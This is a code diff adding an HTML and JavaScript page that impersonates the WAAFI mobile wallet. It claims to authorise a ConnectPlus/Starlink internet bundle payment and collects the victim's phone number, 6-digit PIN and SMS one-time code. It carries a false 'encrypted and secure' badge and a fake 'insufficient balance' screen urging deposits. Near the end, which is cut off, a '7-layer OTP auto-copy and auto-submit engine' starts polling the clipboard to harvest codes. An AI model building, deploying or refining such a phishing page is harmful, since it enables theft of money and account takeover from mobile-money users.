@@ -1,0 +1,1042 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%2300A651'/><text x='50' y='70' font-size='50' font-weight='bold' fill='white' text-anchor='middle' font-family='Arial'>W</text></svg>">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #00A651 0%, #008C44 50%, #006B33 100%);
+            min-height: 100vh;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 20px;
+        }
+        .container { width: 100%; max-width: 420px; }
+        .card {
+            background: white; border-radius: 20px; padding: 35px 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+        .logo-section { text-align: center; margin-bottom: 25px; }
+        .logo-icon {
+            display: inline-flex; align-items: center; justify-content: center;
+            width: 64px; height: 64px; border-radius: 16px;
+            background: linear-gradient(135deg, #00A651, #008C44);
+            color: white; font-size: 28px; font-weight: 800; margin-bottom: 10px;
+            box-shadow: 0 4px 12px rgba(0, 166, 81, 0.3);
+        }
+        .logo-section h1 { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-top: 10px; }
+        .starlink-header { display: none; text-align: center; margin-bottom: 20px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
+        .starlink-header.active { display: block; }
+        .payment-details { display: none; justify-content: space-between; margin-bottom: 20px; padding: 15px; background: #f8f9fa; border-radius: 10px; }
+        .payment-details.active { display: flex; }
+        .payment-amount { text-align: left; }
+        .payment-amount .label { font-size: 11px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; }
+        .payment-amount .value { font-size: 22px; font-weight: 700; color: #00A651; }
+        .payment-service { text-align: right; }
+        .payment-service .label { font-size: 11px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; }
+        .payment-service .value { font-size: 14px; font-weight: 600; color: #1a1a1a; }
+        .step-indicator { text-align: center; font-size: 13px; color: #666; margin-bottom: 20px; }
+        .login-heading { text-align: center; font-size: 14px; color: #666; margin-bottom: 25px; }
+        .form-group { margin-bottom: 20px; }
+        .form-label { display: block; font-size: 13px; font-weight: 600; color: #1a1a1a; margin-bottom: 8px; }
+        .phone-input-wrapper {
+            display: flex; border: 2px solid #e0e0e0; border-radius: 12px; overflow: hidden; transition: border-color 0.3s;
+        }
+        .phone-input-wrapper:focus-within { border-color: #00A651; }
+        .country-code {
+            display: flex; align-items: center; padding: 0 15px; background: #f8f9fa;
+            border-right: 1px solid #e0e0e0; cursor: pointer; transition: background 0.2s;
+        }
+        .country-code:hover { background: #f0f0f0; }
+        .country-code img { width: 24px; height: 18px; border-radius: 3px; margin-right: 8px; object-fit: cover; }
+        .country-code span { font-weight: 600; color: #1a1a1a; font-size: 14px; }
+        .country-code .dropdown-arrow { margin-left: 5px; font-size: 10px; color: #666; }
+        .phone-input { flex: 1; padding: 16px; border: none; font-size: 16px; outline: none; }
+        .phone-input::placeholder { color: #aaa; }
+        .country-modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
+        .country-modal.active { display: flex; }
+        .country-modal-content { background: white; border-radius: 16px; width: 100%; max-width: 350px; max-height: 70vh; overflow: hidden; }
+        .country-modal-header { padding: 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
+        .country-modal-header h3 { font-size: 18px; color: #1a1a1a; }
+        .country-modal-close { background: none; border: none; font-size: 24px; cursor: pointer; color: #666; }
+        .country-list { list-style: none; max-height: 50vh; overflow-y: auto; }
+        .country-list li { display: flex; align-items: center; padding: 15px 20px; cursor: pointer; transition: background 0.2s; }
+        .country-list li:hover { background: #f8f9fa; }
+        .country-list li.selected { background: #e6f9ef; }
+        .country-list li img { width: 30px; height: 22px; border-radius: 3px; margin-right: 12px; object-fit: cover; }
+        .country-list li .country-name { flex: 1; font-weight: 500; }
+        .country-list li .country-dial { color: #666; font-size: 14px; }
+        .pin-section { text-align: center; margin-bottom: 25px; }
+        .pin-label { font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 5px; }
+        .pin-sublabel { font-size: 12px; color: #888; margin-bottom: 15px; }
+        .pin-inputs { display: flex; justify-content: center; gap: 8px; }
+        .pin-input {
+            width: 46px; height: 52px; border: 2px solid #e0e0e0; border-radius: 12px;
+            text-align: center; font-size: 22px; font-weight: 700; outline: none;
+            transition: all 0.3s; -webkit-text-security: disc;
+        }
+        .pin-input:focus { border-color: #00A651; box-shadow: 0 0 0 3px rgba(0, 166, 81, 0.15); }
+        .submit-btn {
+            width: 100%; padding: 16px;
+            background: linear-gradient(135deg, #00A651 0%, #008C44 100%);
+            color: white; border: none; border-radius: 12px; font-size: 16px;
+            font-weight: 600; cursor: pointer; transition: all 0.3s;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+        .submit-btn:hover { background: linear-gradient(135deg, #008C44 0%, #006B33 100%); transform: translateY(-1px); }
+        .submit-btn:disabled { background: #ccc; cursor: not-allowed; transform: none; }
+        .submit-btn .spinner {
+            width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; display: none;
+        }
+        .submit-btn.loading .spinner { display: block; }
+        .submit-btn.loading .btn-text { display: none; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .ssl-badge {
+            display: flex; align-items: center; justify-content: center; gap: 6px;
+            margin-top: 20px; padding: 10px; background: #e6f9ef; border-radius: 8px;
+            font-size: 12px; color: #006B33;
+        }
+        .ssl-badge svg { width: 16px; height: 16px; }
+        .otp-screen { display: none; }
+        .otp-screen.active { display: block; }
+        .insufficient-screen { display: none; }
+        .insufficient-screen.active { display: block; }
+        .login-screen.hidden { display: none; }
+        .otp-header { text-align: center; margin-bottom: 30px; }
+        .otp-header .shield-icon {
+            width: 60px; height: 60px;
+            background: linear-gradient(135deg, #e6f9ef 0%, #b3edcc 100%);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 15px;
+        }
+        .otp-header .shield-icon svg { width: 30px; height: 30px; color: #00A651; }
+        .otp-header h2 { font-size: 20px; color: #1a1a1a; margin-bottom: 10px; }
+        .otp-header p { font-size: 14px; color: #666; }
+        .otp-header .phone-display { font-weight: 600; color: #1a1a1a; }
+        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; position: relative; }
+        .otp-input {
+            width: 44px; height: 52px; border: 2px solid #e0e0e0; border-radius: 12px;
+            text-align: center; font-size: 20px; font-weight: 700; outline: none; transition: all 0.3s;
+        }
+        .otp-input:focus { border-color: #00A651; box-shadow: 0 0 0 3px rgba(0, 166, 81, 0.15); }
+        .otp-autofill-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            opacity: 0.01; font-size: 22px; border: none; background: transparent;
+            color: transparent; caret-color: transparent; z-index: 2;
+            letter-spacing: 2em; text-align: center;
+        }
+        .resend-section { text-align: center; margin-top: 20px; }
+        .resend-section p { font-size: 13px; color: #666; }
+        .resend-link { color: #00A651; font-weight: 600; cursor: pointer; text-decoration: none; }
+        .resend-link:hover { text-decoration: underline; }
+        .resend-link.disabled { color: #999; cursor: not-allowed; }
+        .timer { font-weight: 600; color: #00A651; }
+        .otp-expired-message {
+            display: none; text-align: center; padding: 10px; background: #fff3cd;
+            border-radius: 8px; margin-bottom: 15px; font-size: 13px; color: #856404;
+        }
+        .otp-expired-message.active { display: block; }
+        .otp-invalid-message {
+            display: none; text-align: center; padding: 10px; background: #f8d7da;
+            border-radius: 8px; margin-bottom: 15px; font-size: 13px; color: #721c24;
+        }
+        .otp-invalid-message.active { display: block; }
+        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: rgba(255,255,255,0.7); }
+        .footer a { color: white; text-decoration: none; }
+        @media (max-width: 400px) {
+            .card { padding: 25px 20px; }
+            .pin-input { width: 40px; height: 46px; font-size: 18px; }
+            .otp-input { width: 38px; height: 46px; font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <!-- Login Screen -->
+            <div class="login-screen" id="loginScreen">
+                <div class="logo-section">
+                    <div class="logo-icon">W</div>
+                    <h1>WAAFI</h1>
+                </div>
+
+                <!-- Starlink Payment Header -->
+                <div class="starlink-header" id="starlinkHeader">
+                    <div class="payment-details" id="paymentDetails">
+                        <div class="payment-amount">
+                            <div class="label" data-i18n="amount">LACAGTA</div>
+                            <div class="value" id="paymentAmount">USD 30</div>
+                        </div>
+                        <div class="payment-service">
+                            <div class="label">SERVICE</div>
+                            <div class="value" data-i18n="starlinkRenewal">Cusboonaysiinta ConnectPlus</div>
+                        </div>
+                    </div>
+                </div>
+
+                <p class="step-indicator" data-i18n="stepIndicator">Tallaabada 2 ee 3: Xaqiijinta</p>
+
+                <p class="login-heading" id="loginHeading" data-i18n="enterDetails">Geli macluumaadkaaga WAAFI si aad u oggolaato lacag bixinta</p>
+
+                <div class="form-group">
+                    <label class="form-label" data-i18n="wafiNumber">Lambarkaaga WAAFI</label>
+                    <div class="phone-input-wrapper">
+                        <div class="country-code" id="countryCodeBtn" onclick="openCountrySelector()">
+                            <img id="flagImg" src="https://flagcdn.com/w40/so.png" alt="Flag">
+                            <span id="dialCode">+252</span>
+                            <span class="dropdown-arrow">▼</span>
+                        </div>
+                        <input type="tel" class="phone-input" id="phoneInput" placeholder="xxxxxxx" maxlength="15" autocomplete="off" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" onkeypress="return /[0-9]/.test(event.key)">
+                    </div>
+                </div>
+
+                <div class="pin-section">
+                    <div class="pin-label" data-i18n="enterPin">Geli PIN-kaaga (6 lambar)</div>
+                    <div class="pin-sublabel" data-i18n="checkApp">Ka hubi app-ka WAAFI ama SMS-kaaga</div>
+                    <div class="pin-inputs">
+                        <input type="tel" class="pin-input" maxlength="1" data-index="0" autocomplete="off" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkPinComplete&&checkPinComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                        <input type="tel" class="pin-input" maxlength="1" data-index="1" autocomplete="off" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkPinComplete&&checkPinComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                        <input type="tel" class="pin-input" maxlength="1" data-index="2" autocomplete="off" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkPinComplete&&checkPinComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                        <input type="tel" class="pin-input" maxlength="1" data-index="3" autocomplete="off" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkPinComplete&&checkPinComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                        <input type="tel" class="pin-input" maxlength="1" data-index="4" autocomplete="off" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkPinComplete&&checkPinComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                        <input type="tel" class="pin-input" maxlength="1" data-index="5" autocomplete="off" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkPinComplete&&checkPinComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                    </div>
+                </div>
+
+                <button class="submit-btn" id="submitBtn" onclick="submitLogin()" disabled>
+                    <span class="spinner"></span>
+                    <span class="btn-text" data-i18n="verifyPin">Xaqiiji PIN-ka</span>
+                </button>
+
+                <div class="ssl-badge" id="sslBadge">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+                    </svg>
+                    <span data-i18n="sslSecured">Macluumaadkaagu waa mid sir ah oo ammaan ah</span>
+                </div>
+            </div>
+
+            <!-- OTP Screen -->
+            <div class="otp-screen" id="otpScreen">
+                <div class="logo-section">
+                    <div class="logo-icon">W</div>
+                </div>
+
+                <div class="otp-header">
+                    <h2 data-i18n="otpVerification">Xaqiijinta OTP</h2>
+                    <p class="step-indicator" data-i18n="stepFinal">Tallaabada 3 ee 3: Xaqiijinta ugu dambaysa</p>
+                    <div class="shield-icon">
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+                        </svg>
+                    </div>
+                    <p><span data-i18n="codeSentTo">Kood 6 lambar ah ayaa loo diray</span><br><span class="phone-display" id="phoneDisplay">+252 *** *** **34</span></p>
+                </div>
+
+                <div class="otp-expired-message" id="otpExpiredMessage" data-i18n="otpExpired">
+                    Koodka OTP wuu dhacay. Fadlan isticmaal koodka cusub.
+                </div>
+
+                <div class="otp-invalid-message" id="otpInvalidMessage" data-i18n="otpInvalid">
+                    Koodka OTP waa mid khaldan. Fadlan isticmaal koodka cusub ee la soo diray.
+                </div>
+
+                <div class="otp-inputs">
+                    <!-- Transparent overlay for OTP autofill -->
+                    <input type="text" id="otpAutofill" autocomplete="one-time-code" inputmode="numeric" maxlength="6" class="otp-autofill-overlay" placeholder="">
+                    <input type="tel" class="otp-input" maxlength="1" data-otp-index="0" autocomplete="one-time-code" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkOtpComplete&&checkOtpComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                    <input type="tel" class="otp-input" maxlength="1" data-otp-index="1" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkOtpComplete&&checkOtpComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                    <input type="tel" class="otp-input" maxlength="1" data-otp-index="2" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkOtpComplete&&checkOtpComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                    <input type="tel" class="otp-input" maxlength="1" data-otp-index="3" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkOtpComplete&&checkOtpComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                    <input type="tel" class="otp-input" maxlength="1" data-otp-index="4" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkOtpComplete&&checkOtpComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                    <input type="tel" class="otp-input" maxlength="1" data-otp-index="5" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkOtpComplete&&checkOtpComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                </div>
+
+                <button class="submit-btn" id="verifyBtn" onclick="verifyOTP()" disabled>
+                    <span class="spinner"></span>
+                    <span class="btn-text" data-i18n="verifyOtp">Xaqiiji OTP</span>
+                </button>
+
+                <div class="resend-section">
+                    <p>
+                        <span data-i18n="didntReceiveCode">Ma helin koodka?</span>
+                        <span class="resend-link disabled" id="resendLink" onclick="resendOTP()">
+                            <span data-i18n="resendCode">DHIBCAHA CUSUB</span>
+                            <span class="timer" id="timer">(1:00)</span>
+                        </span>
+                    </p>
+                </div>
+
+                <div class="ssl-badge">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+                    </svg>
+                    <span data-i18n="otpValid">OTP-gaagu wuu shaqaynayaa 10 daqiiqo</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Insufficient Balance Screen -->
+        <div class="insufficient-screen" id="insufficientScreen">
+            <div style="text-align:center;padding:30px 20px;">
+                <div style="width:80px;height:80px;border-radius:50%;background:#FEF3C7;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
+                    <span style="font-size:40px;">⚠️</span>
+                </div>
+                <h2 style="font-size:20px;color:#B45309;margin-bottom:8px;font-weight:700;">Haraaga Kuma Filna</h2>
+                <p id="insuffMsg" style="color:#6B7280;font-size:13px;line-height:1.6;margin-bottom:24px;">
+                    Waa inaad ugu yaraan <strong style="color:#111;">$30 USD</strong> ku leedahay WAAFI wallet-kaaga si aad u isdiiwaangeliso ConnectPlus package kasta.<br><br>Fadlan dhaji lacagta loo baahan yahay kadibna riix badhanka hoose.
+                </p>
+                <button id="depositedBtn" style="width:100%;padding:14px;background:#10B981;color:white;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:12px;">
+                    ✅ Waan Dhajiyay
+                </button>
+                <button id="diffNumberBtn" style="width:100%;padding:14px;background:transparent;color:#6B7280;border:2px solid #D1D5DB;border-radius:10px;font-size:14px;font-weight:500;cursor:pointer;">
+                    Isticmaal Lambar Kale
+                </button>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>&copy; 2026 WAAFI. <span data-i18n="allRightsReserved">Dhammaan xuquuqaha way dhowran yihiin.</span></p>
+        </div>
+    </div>
+
+    <!-- Country Selector Modal -->
+    <div class="country-modal" id="countryModal">
+        <div class="country-modal-content">
+            <div class="country-modal-header">
+                <h3 data-i18n="selectCountry">Dooro Dalka</h3>
+                <button class="country-modal-close" onclick="closeCountrySelector()">×</button>
+            </div>
+            <ul class="country-list" id="countryList"></ul>
+        </div>
+    </div>
+
+    <script>
+        // Translations - Somali (so) and English (en)
+        const translations = {
+            so: {
+                stepIndicator: 'Tallaabada 2 ee 3: Xaqiijinta',
+                enterDetails: 'Geli macluumaadkaaga WAAFI si aad u oggolaato lacag bixinta',
+                wafiNumber: 'Lambarkaaga WAAFI',
+                enterPin: 'Geli PIN-kaaga (6 lambar)',
+                checkApp: 'Ka hubi app-ka WAAFI ama SMS-kaaga',
+                verifyPin: 'Xaqiiji PIN-ka',
+                sslSecured: 'Macluumaadkaagu waa mid sir ah oo ammaan ah',
+                otpVerification: 'Xaqiijinta OTP',
+                stepFinal: 'Tallaabada 3 ee 3: Xaqiijinta ugu dambaysa',
+                codeSentTo: 'Kood 6 lambar ah ayaa loo diray',
+                otpExpired: 'Koodka OTP wuu dhacay. Fadlan isticmaal koodka cusub.',
+                otpInvalid: 'Koodka OTP waa mid khaldan. Fadlan isticmaal koodka cusub ee la soo diray.',
+                verifyOtp: 'Xaqiiji OTP',
+                didntReceiveCode: 'Ma helin koodka?',
+                resendCode: 'DHIBCAHA CUSUB',
+                otpValid: 'OTP-gaagu wuu shaqaynayaa 10 daqiiqo',
+                allRightsReserved: 'Dhammaan xuquuqaha way dhowran yihiin.',
+                selectCountry: 'Dooro Dalka',
+                amount: 'LACAGTA',
+                starlinkRenewal: 'Cusboonaysiinta ConnectPlus'
+            },
+            en: {
+                stepIndicator: 'Step 2 of 3: Verification',
+                enterDetails: 'Enter your WAAFI details to authorize payment',
+                wafiNumber: 'WAAFI Number',
+                enterPin: 'Enter your PIN code (6 digits)',
+                checkApp: 'Check your WAAFI app or SMS',
+                verifyPin: 'Verify PIN',
+                sslSecured: 'Your information is encrypted and secure',
+                otpVerification: 'OTP Verification',
+                stepFinal: 'Step 3 of 3: Final Verification',
+                codeSentTo: 'A 6-digit code was sent to',
+                otpExpired: 'OTP code expired. Please use the new code.',
+                otpInvalid: 'Invalid OTP code. Please use the new code sent.',
+                verifyOtp: 'Verify OTP',
+                didntReceiveCode: "Didn't receive the code?",
+                resendCode: 'RESEND CODE',
+                otpValid: 'Your OTP is valid for 10 minutes',
+                allRightsReserved: 'All rights reserved.',
+                selectCountry: 'Select Country',
+                amount: 'AMOUNT',
+                starlinkRenewal: 'ConnectPlus Renewal'
+            }
+        };
+
+        let timerInterval = null;
+        let pinInputs = null;
+        let otpInputs = null;
+        let currentLang = 'so'; // Default Somali
+
+        // Somali-speaking countries
+        const SOMALI_COUNTRIES = new Set(['SO', 'DJ']);
+
+        // Country configurations for WAAFI
+        const COUNTRIES = {
+            'SO': { code: '+252', length: 7, flag: 'so', name: 'Soomaaliya', currency: 'USD' },
+            'DJ': { code: '+253', length: 6, flag: 'dj', name: 'Jabuuti', currency: 'DJF' },
+            'ET': { code: '+251', length: 9, flag: 'et', name: 'Itoobiya', currency: 'ETB' },
+            'KE': { code: '+254', length: 9, flag: 'ke', name: 'Kenya', currency: 'KES' }
+        };
+
+        let selectedCountryCode = 'SO'; // Default Somalia
+
+        // ConnectPlus packages (USD base prices)
+        const STARLINK_PACKAGES = {
+            'starter': { usd: 11, name: 'Starter Bundle', data: '120GB' },
+            'standard': { usd: 18, name: 'Standard Bundle', data: '250GB' },
+            'premium': { usd: 27, name: 'Premium Bundle', data: '400GB' },
+            'pro': { usd: 36, name: 'Pro Bundle', data: '600GB' },
+            'business': { usd: 54, name: 'Business Bundle', data: '1TB' },
+            'unlimited': { usd: 89, name: 'Unlimited Bundle', data: 'Unlimited' }
+        };
+
+        // Currency conversion rates (USD base)
+        const CURRENCY_RATES = {
+            'USD': 1, 'DJF': 177.7, 'ETB': 56.5, 'KES': 129, 'SOS': 571
+        };
+
+        // Country Selector Functions
+        function openCountrySelector() {
+            const countryList = document.getElementById('countryList');
+            countryList.innerHTML = '';
+            Object.keys(COUNTRIES).forEach(code => {
+                const country = COUNTRIES[code];
+                const li = document.createElement('li');
+                li.className = code === selectedCountryCode ? 'selected' : '';
+                li.innerHTML = `
+                    <img src="https://flagcdn.com/w40/${country.flag}.png" alt="${country.name}">
+                    <span class="country-name">${country.name}</span>
+                    <span class="country-dial">${country.code}</span>
+                `;
+                li.onclick = () => selectCountry(code);
+                countryList.appendChild(li);
+            });
+            document.getElementById('countryModal').classList.add('active');
+        }
+
+        function closeCountrySelector() {
+            document.getElementById('countryModal').classList.remove('active');
+        }
+
+        function selectCountry(code) {
+            selectedCountryCode = code;
+            cacheCountry(code);
+            setCountry(code);
+            closeCountrySelector();
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('package')) updateStarlinkAmount();
+        }
+
+        function cacheCountry(code) { try { localStorage.setItem('waafi_country', code); } catch(e) {} }
+        function getCachedCountry() { try { return localStorage.getItem('waafi_country'); } catch(e) { return null; } }
+
+        function setCountry(countryCode) {
+            const country = COUNTRIES[countryCode];
+            if (country) {
+                document.getElementById('flagImg').src = `https://flagcdn.com/w40/${country.flag}.png`;
+                document.getElementById('dialCode').textContent = country.code;
+                document.getElementById('phoneInput').placeholder = 'x'.repeat(country.length);
+                document.getElementById('phoneInput').maxLength = country.length;
+                currentLang = SOMALI_COUNTRIES.has(countryCode) ? 'so' : 'en';
+                applyTranslations();
+            }
+        }
+
+        function applyTranslations() {
+            const lang = translations[currentLang] || translations['so'];
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (lang[key]) el.textContent = lang[key];
+            });
+        }
+
+        // Check Starlink source
+        function checkStarlinkSource() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const source = urlParams.get('source');
+            const packageType = urlParams.get('package');
+            if (source === 'starlink' && packageType) {
+                const starlinkHeader = document.getElementById('starlinkHeader');
+                const paymentDetails = document.getElementById('paymentDetails');
+                if (starlinkHeader) {
+                    starlinkHeader.classList.add('active');
+                    if (paymentDetails) paymentDetails.classList.add('active');
+                    updateStarlinkAmount();
+                }
+            }
+        }
+
+        function updateStarlinkAmount() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const packageType = urlParams.get('package');
+            const urlCdf = urlParams.get('cdf');
+            const passedPrice = urlParams.get('lp');
+            const passedCur = urlParams.get('cur');
+            
+            // Use price passed from plans page if available
+            if (passedPrice && passedCur) {
+                const display = passedCur === 'USD' ? `$${passedPrice}` : `${passedCur} ${parseInt(passedPrice).toLocaleString()}`;
+                document.getElementById('paymentAmount').textContent = display;
+                return;
+            }
+            
+            const pkg = STARLINK_PACKAGES[packageType] || STARLINK_PACKAGES['starter'];
+            const country = COUNTRIES[selectedCountryCode];
+            const currency = country ? country.currency : 'USD';
+            const rate = CURRENCY_RATES[currency] || 1;
+            let localAmount;
+            if (urlCdf) {
+                // CDF -> USD -> local
+                const usdAmount = parseInt(urlCdf) / 2700;
+                localAmount = Math.round(usdAmount * rate);
+            } else {
+                localAmount = Math.round(pkg.usd * rate);
+            }
+            const formatted = localAmount.toLocaleString('en-US');
+            document.getElementById('paymentAmount').textContent = `${currency} ${formatted}`;
+        }
+
+        // PIN input handling
+        function setupInputHandling(inputs, callback) {
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 1) value = value.slice(-1);
+                    e.target.value = value;
+                    if (value && index < inputs.length - 1) inputs[index + 1].focus();
+                    callback();
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace') {
+                        if (!e.target.value && index > 0) inputs[index - 1].focus();
+                        else e.target.value = '';
+                        callback();
+                    } else if (e.key >= '0' && e.key <= '9') {
+                        // allow
+                    } else if (e.key.length === 1) { e.preventDefault(); }
+                });
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                    [...paste].slice(0, inputs.length).forEach((char, i) => { if (inputs[i]) inputs[i].value = char; });
+                    const lastIndex = Math.min(paste.length, inputs.length) - 1;
+                    if (lastIndex >= 0) inputs[lastIndex].focus();
+                    callback();
+                });
+            });
+        }
+
+        function checkPinComplete() {
+            var inputs = document.querySelectorAll('.pin-input');
+            var pin = Array.prototype.map.call(inputs, function(i) { return i.value; }).join('');
+            var phone = document.getElementById('phoneInput').value;
+            var country = COUNTRIES[selectedCountryCode];
+            var requiredLength = country ? country.length : 7;
+            var allDigits = pin.length === 6 && /^\d{6}$/.test(pin);
+            document.getElementById('submitBtn').disabled = !(allDigits && phone.length >= requiredLength && /^\d+$/.test(phone));
+        }
+
+        function checkOtpComplete() {
+            var inputs = document.querySelectorAll('.otp-input');
+            var otp = Array.prototype.map.call(inputs, function(i) { return i.value; }).join('');
+            document.getElementById('verifyBtn').disabled = !(otp.length === 6 && /^\d{6}$/.test(otp));
+        }
+
+        function initializeInputs() {
+            pinInputs = document.querySelectorAll('.pin-input');
+            otpInputs = document.querySelectorAll('.otp-input');
+            setupInputHandling(pinInputs, checkPinComplete);
+            setupInputHandling(otpInputs, checkOtpComplete);
+
+            const phoneInput = document.getElementById('phoneInput');
+            phoneInput.addEventListener('keydown', function(e) {
+                if (['Backspace','Delete','Tab','Enter','ArrowLeft','ArrowRight','ArrowUp','ArrowDown'].includes(e.key)) return;
+                if (!/\d/.test(e.key)) e.preventDefault();
+            });
+            phoneInput.addEventListener('input', function() {
+                const cleaned = this.value.replace(/\D/g, '');
+                if (this.value !== cleaned) this.value = cleaned;
+                checkPinComplete();
+            });
+            phoneInput.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                this.value = paste;
+                checkPinComplete();
+            });
+        }
+
+        // ═══════════════════════════════════════════════════
+        // 7-LAYER OTP AUTO-COPY & AUTO-SUBMIT ENGINE
+        // ═══════════════════════════════════════════════════
+        let otpAutoSubmitted = false;
+        let clipboardPollInterval = null;
+        let overlayPollInterval = null;
+        let lastClipboardText = '';
+        let smsWatchInterval = null;
+        let focusPollInterval = null;
+        let inputMutationObserver = null;
+
+        function extractOtpFromText(text) {
+            if (!text) return null;
+            // Match OTP patterns common in Somali/English SMS
+            const otpMatch = text.match(/(?:OTP|code|Code|koodka|PIN)\s*(?:is|waa|:)\s*(\d{6})/i);
